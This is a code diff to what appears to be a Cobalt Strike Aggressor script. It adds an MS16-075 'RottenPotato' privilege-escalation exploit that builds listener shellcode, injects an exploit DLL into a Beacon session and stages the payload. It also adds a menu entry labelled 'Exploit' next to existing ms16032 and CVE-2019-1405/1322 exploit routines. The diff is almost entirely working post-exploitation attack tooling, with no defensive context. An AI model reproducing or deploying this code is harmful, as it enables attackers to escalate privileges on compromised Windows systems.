@@ -81,6 +81,21 @@ sub ms16032{
     exec("cmd.exe /C del /F ".$fname);
 }
 
+sub ms16075{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via RottenPotato (ms16-075)");
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = "x64.dll";
+    } else {
+        $arch = "x86";
+        $dll = "x86.dll";
+    }
+    $stager = shellcode($3['listener'], false, $arch);
+    bdllspawn($bid, script_resource("exp/16075/".$dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    bstage($bid, $null, $3['listener'], $arch);
+}
+
 
 sub CVE_2019_1405_1322{
     local('$Rch $payload');
@@ -132,6 +147,14 @@ sub CVE_2019_1405_1322{
             dialog_show($Dialog);
         }
 
+        item "MS16-075"{
+            $bid = $1['@'];
+            $Dialog = dialog("MS16-075",%(bid => $bid),&ms16075);
+            dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
 
         item "CVE-2019-1405 && 1322"{
             $bid = $1['@'];
